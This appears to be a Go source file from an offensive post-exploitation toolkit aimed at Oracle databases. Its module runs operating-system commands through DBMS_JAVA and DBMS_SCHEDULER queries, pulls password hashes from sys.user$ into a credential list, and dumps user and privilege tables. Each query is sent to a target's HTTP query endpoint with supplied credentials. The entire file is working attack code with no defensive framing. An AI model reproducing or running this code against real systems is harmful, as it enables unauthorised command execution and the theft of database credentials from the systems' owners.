package dbpost

import (
	"encoding/json"
	"fmt"
	"strings"
)

type OracleExploit struct {
	config *DBPostConfig
	client *HTTPClient
}

func NewOracleExploit(config *DBPostConfig, client *HTTPClient) *OracleExploit {
	return &OracleExploit{
		config: config,
		client: client,
	}
}

func (o *OracleExploit) JavaObjectInject(creds *DBCreds, result *PostExploitResult) (*PostExploitResult, error) {
	result.Technique = TechniqueJavaObject

	queries := []string{
		`SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper:0:0 id') FROM dual`,
		`SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper:0:0 whoami') FROM dual`,
		`SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper:0:0 hostname') FROM dual`,
	}

	var output strings.Builder
	for _, query := range queries {
		resp, err := o.executeQuery(creds, query)
		if err != nil {
			output.WriteString(fmt.Sprintf("Error: %v\n", err))
			continue
		}
		output.WriteString(fmt.Sprintf("Query: %s\nResult: %s\n\n", query, resp))
	}

	if output.Len() > 0 {
		result.Success = true
		result.CmdOutput = output.String()
		result.Data = map[string]interface{}{
			"method":  "java_object_injection",
			"queries": len(queries),
		}
		return result, nil
	}

	return result, fmt.Errorf("java object injection failed")
}

func (o *OracleExploit) KhuntCmd(creds *DBCreds, result *PostExploitResult) (*PostExploitResult, error) {
	result.Technique = TechniqueKhuntCmd

	commands := []string{"id", "whoami", "hostname", "uname -a"}

	var output strings.Builder
	for _, cmd := range commands {
		query := fmt.Sprintf(`SELECT DBMS_SCHEDULER.RUN_JOB('KHUNT_CMD:%s') FROM dual`, cmd)
		resp, err := o.executeQuery(creds, query)
		if err != nil {
			output.WriteString(fmt.Sprintf("Error executing %s: %v\n", cmd, err))
			continue
		}
		output.WriteString(fmt.Sprintf("=== %s ===\n%s\n\n", cmd, resp))
	}

	if output.Len() > 0 {
		result.Success = true
		result.CmdOutput = output.String()
		result.Data = map[string]interface{}{
			"method":   "khunt_cmd",
			"commands": len(commands),
		}
		return result, nil
	}

	return result, fmt.Errorf("khunt cmd failed")
}

func (o *OracleExploit) KhuntHash(creds *DBCreds, result *PostExploitResult) (*PostExploitResult, error) {
	result.Technique = TechniqueKhuntHash

	query := `SELECT name, password, spare4 FROM sys.user$ WHERE type# = 1 AND ROWNUM <= 100`
	resp, err := o.executeQuery(creds, query)
	if err != nil {
		return result, fmt.Errorf("query failed: %w", err)
	}

	var credsList []CredentialEntry
	lines := strings.Split(resp, "\n")
	for _, line := range lines {
		parts := strings.Fields(line)
		if len(parts) >= 2 {
			cred := CredentialEntry{
				Username: parts[0],
				Password: parts[1],
				Source:   "oracle_khunt_hash",
				Role:     "DBA",
			}
			if len(parts) >= 3 {
				cred.Hash = parts[2]
			}
			credsList = append(credsList, cred)
		}
	}

	if len(credsList) > 0 {
		result.Success = true
		result.Credentials = credsList
		result.Data = map[string]interface{}{
			"method": "khunt_hash",
			"count":  len(credsList),
		}
		return result, nil
	}

	return result, fmt.Errorf("khunt hash extraction failed")
}

func (o *OracleExploit) RegistryDump(creds *DBCreds, result *PostExploitResult) (*PostExploitResult, error) {
	result.Technique = TechniqueRegistryDump

	queries := []map[string]string{
		{"query": "SELECT * FROM V$VERSION", "key": "version"},
		{"query": "SELECT * FROM V$INSTANCE", "key": "instance"},
		{"query": "SELECT * FROM V$DATABASE", "key": "database"},
		{"query": "SELECT * FROM DBA_USERS WHERE ROWNUM <= 50", "key": "users"},
		{"query": "SELECT * FROM DBA_SYS_PRIVS WHERE ROWNUM <= 50", "key": "privileges"},
	}

	data := make(map[string]interface{})
	for _, q := range queries {
		resp, err := o.executeQuery(creds, q["query"])
		if err != nil {
			data[q["key"]] = fmt.Sprintf("Error: %v", err)
			continue
		}
		data[q["key"]] = resp
	}

	if len(data) > 0 {
		result.Success = true
		result.Data = data
		return result, nil
	}

	return result, fmt.Errorf("registry dump failed")
}

func (o *OracleExploit) executeQuery(creds *DBCreds, query string) (string, error) {
	target := BuildURL(o.config.Target, "/xml_query", 0)

	payload := fmt.Sprintf(`{
		"query": "%s",
		"user": "%s",
		"password": "%s",
		"database": "%s"
	}`, strings.ReplaceAll(query, `"`, `\"`), creds.Username, creds.Password, creds.Database)

	body := strings.NewReader(payload)
	_, resp, err := o.client.Post(target, body, map[string]string{
		"Content-Type": "application/json",
	})
	if err != nil {
		return "", fmt.Errorf("execute query: %w", err)
	}

	var result map[string]interface{}
	if json.Unmarshal(resp, &result) == nil {
		if data, ok := result["data"].(string); ok {
			return data, nil
		}
		if error, ok := result["error"].(string); ok {
			return "", fmt.Errorf("oracle error: %s", error)
		}
	}

	return string(resp), nil
}
